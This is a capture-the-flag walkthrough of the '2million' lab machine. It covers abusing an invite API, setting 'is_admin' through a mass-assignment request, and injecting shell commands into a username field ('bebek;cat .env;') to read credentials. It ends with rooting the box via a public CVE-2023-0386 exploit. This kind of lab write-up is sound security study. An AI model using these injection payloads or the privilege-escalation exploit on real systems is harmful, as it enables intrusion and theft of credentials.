![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/64aa6631-b7a8-4377-9bcf-0751ee77a357)1. Run Nmap to check which port is opened from the website.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/35f857a9-b6c5-4ec1-9317-dd0dcea44fc3)

2. Add Vhost to /etc/hosts with named 2million.htb so we are able to see the website's content. <br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/8e65e202-ba12-44dc-95f4-d248a56de077)

Website's content:

![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/3ddf0471-3d80-4d71-b831-83e83465f440)

3. After analyze all of the feature, inside join feature, we can input the special code before making an account.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/2d2c5210-5a5d-472a-a56f-0bbd2badbe07)

Content:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/5cd8fc00-f19d-43a7-b4d2-fbf4663bb5a5)

4. Let's check the source code and we found that the feature directed to /js/inviteapi.min.js.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/5b0731a6-dc47-4dae-8f43-954152709af9)

5. When we opened the file, it seems that the code is obfuscated.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/654985bd-7453-4430-872d-e8f73c3b27b6)

6. We can deofuscated with this amazing [tool](https://lelinhtinh.github.io/de4js/).
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/69db88a6-a7a8-4599-8f10-5d0eb0d33ea9)

7. As we can see that the code is sent to 2million.htb/api/v1/invite/how/to/generate. to see what the codes inside there, we can run `curl -X POST 2million.htb/api/v1/invite/how/to/generate` where -X is to run the method.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/b913fc84-8b3a-42dc-9758-f9784e6f07ed)

8. We know that the message encoded using ROT 13, so we can decode with this [website](https://www.dcode.fr/rot-13-cipher).
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d6cbb0b6-d3c2-495c-911d-0e4a05495943)

9. The message says that we have to send request to 2million.htb/api/v1/invite/generate. We can use `curl -X POST 2million.htb/api/v1/invite/generate`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/0c65752e-2e1c-41fa-9dd7-cd66ef561369)

10. Seems like it's base64 encoded message, so we decoded and YES! we get our special code and directed to Register page!.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/27a13a23-c73e-4423-84de-09809812d449)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/a2d32665-cf49-47c9-b59f-4d6c5bc22190)

Register Page:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/29a36c04-cd44-4887-b08a-ba7ce1880fda)

11. Just give a random data and for my case, I inserted my username with bebek, email bebek@2million.htb, dan password bebekgoreng.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/cdad42d1-1a49-49a6-ab15-89674875b278)

12. Do login with our credentials before and we can see the homepage like this.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/cd685a93-5d25-4d90-9db5-35b073a7edab)

Homepage:
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/6414a2ff-7c3c-485a-acaa-259ea5893f88)

13. Again, checking one by one feature and found something interesting inside access feature. In this feature, we can download our own VPN Certificate (OpenVPN).
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/ac67b9b8-9201-4334-99eb-6cdd9b60b026)

14. Let's check the source code and we can know that the certificate is generated from `/api/v1/users/vpn/generate`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e225d551-7bf1-4655-9772-83525fdc6234)

15. When we opened the endpoint, we can only see the certificate content from the user so we can't get any crucial information there.Therefore, we are going to check the API itself with `curl -v 2million.htb/api`. <br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/ee3e07c7-2465-4997-9c78-85b527e50d47)

16. Copy the website's cookie and check the API endpoint using this command `curl -v 2million.htb/api --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2"`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/c2cb0801-6339-44e6-b699-88591a028037)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/a68f1b35-1f6d-44de-9e1d-e830be94a427)

17.Next let's check the api version endpoint with command `curl -v 2million.htb/api/v1 --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2"`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/a31d5c4e-8243-4a4e-8cd7-46c9df709664)

18. There are several endpoints and all are related to admin. Since we are not admin yet, the feature that become the main focus is update. Checking the feature can be done by executing this command `curl -v -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2"`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/9be62ce6-e3f2-4288-96a7-a90d3be64a6f)

19. The message shows that we have to input some data. In this case, we input our email and password like this `curl -v -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"email":"bebek@2million.htb", "password": "bebekgoreng"}'`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/c6987d1f-eef9-4d77-9093-969e0d1665f1)

20. Now the message shows that is_admin is not in there so, we can set *is_admin value to true or is_admin = 1* with this command `curl -v -X PUT 2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"email":"bebek@2million.htb", "password": "bebekgoreng", "is_admin": 1}'`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/ade0bcad-912f-4f72-802c-ada8014fff14)

21. To check if my account is admin or not, we can use the auth feature with this command `curl -v 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2"`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/e6e7bf7b-38d8-4a16-a52a-a696333250f3)

22. YES! We get the admin privilege, now we can check admin's VPN certificate. Command: `curl -v -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json"`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/c09e53d5-7760-4057-b6e4-01770d8f3683)

23. The message now shows that there is missing parameter named username so we can input our username inside our payload. Command: `curl -v -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"username": "bebek"}'`.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d8ecc215-bc9f-4971-938d-a6b7b005cbe0)

24. Okay, now the website generated the user's VPN certificate to us. How about next? Well, we now analyze if this configuration using exec() or system() in php. If yes then it becomes the vulnerability of this website. To prove it, we can insert linux command such as id, ls, cat, etc. between the data input like this `curl -v -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"username": "bebek;ls;"}'.`<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/aa551358-d495-43d1-8954-d23ae0770984)

25. It works! Now we can add -a to see all hidden files inside. Command: `curl -v -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"username": "bebek;ls -a;"}'.`<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/6b964261-894c-4ac0-9db0-939ecab46e1f)

26. Env file is always the main thing to get some crucial credentials. To open it we can use cat command. `curl -v -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=e176qt56ar4je2kic6mjfvj7a2" --header "Content-Type: application/json" --data '{"username": "bebek;cat .env;"}'.`<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1270aa62-feb1-4d83-b111-455219506f72)

27. From there we know the admin and the password. We can use ssh to use admin's terminal. `ssh admin@2million.htb`. Right after login, we get the user flag!<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/7d4e4815-e538-4d94-93a2-959bc3fe5d1c)

28. Now we want to find the root flag. Unfortunately, we can't get the su privilege directly.<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/6329e9a7-e3ba-47aa-9553-e6bcc353a4cb)

29. Checking one by one directory inside the terminal and found some interesting message inside mail folder.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/fa94501a-e7fb-4e88-b9e3-d9746cb58998)

30. The message says that there is CVE that related to OverlayFS and when we search in Google, we found that this is [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386) with this [payload](https://github.com/sxlmnwb/CVE-2023-0386).

31. Run git clone https://github.com/sxlmnwb/CVE-2023-0386 inside our local terminal and zip the folder then copy the zip to the admin terminal with command scp payload.zip admin@2million.htb:/home/admin.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/67c34621-0aa8-4e21-9995-55f30fb0e51f)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/03bf5fc5-e295-4ff6-a26b-a7330e2b671f)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/1ec2258a-d2f1-4bf9-ad34-10ad97525e41)

Result in admin terminal:<br>
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/a23d3dd6-3920-4a46-84e1-15c5569e2b47)

32. Unzip the file and execute the payload which is already listed in the github.
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/fcbf7136-56ad-415a-9f32-9e8a4db7f64c)
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/d9f1f897-9743-49eb-be1c-8d516204ae5f)

33. Let's go! we get the root privilege and got the flag from root directory!
![image](https://github.com/LawsonSchwantz/Writeups/assets/74954683/5bf3edbd-9e2c-4f6f-84dc-2e900d8d1a88)

